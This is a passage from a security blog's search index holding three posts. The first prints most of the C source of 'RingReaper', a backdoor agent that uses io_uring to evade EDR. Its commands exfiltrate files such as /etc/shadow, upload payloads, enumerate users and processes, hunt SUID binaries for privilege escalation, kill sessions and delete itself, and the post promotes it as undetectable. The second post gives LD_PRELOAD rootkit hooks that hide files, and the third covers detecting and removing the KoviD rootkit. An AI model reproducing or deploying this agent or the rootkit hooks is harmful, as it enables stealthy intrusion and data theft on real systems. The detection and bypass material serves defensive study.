io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, \u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"},{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so ls /etc/ld.so.preload\nBesides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.\nBut for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to 